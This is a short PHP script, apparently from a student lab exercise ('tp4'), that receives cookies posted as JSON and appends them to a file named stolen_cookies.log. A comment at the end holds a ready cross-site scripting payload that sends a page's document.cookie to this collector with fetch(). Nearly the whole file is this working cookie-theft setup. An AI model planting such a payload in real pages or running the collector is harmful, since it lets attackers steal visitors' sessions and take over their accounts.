<?php
// save_cookies.php

// Get the raw POST data
$input = file_get_contents("php://input");

// Decode the JSON payload
$data = json_decode($input, true);

// Save the cookies to a log file
if (!empty($data['cookies'])) {
    file_put_contents("stolen_cookies.log", date('Y-m-d H:i:s') . " - " . $data['cookies'] . PHP_EOL, FILE_APPEND);
}

http_response_code(200); 

// <script>   fetch('http://localhost/tp4/server/save_cookies.php', {     method: 'POST',     headers: { 'Content-Type': 'application/json' },     body: JSON.stringify({ cookies: document.cookie })   }); </script>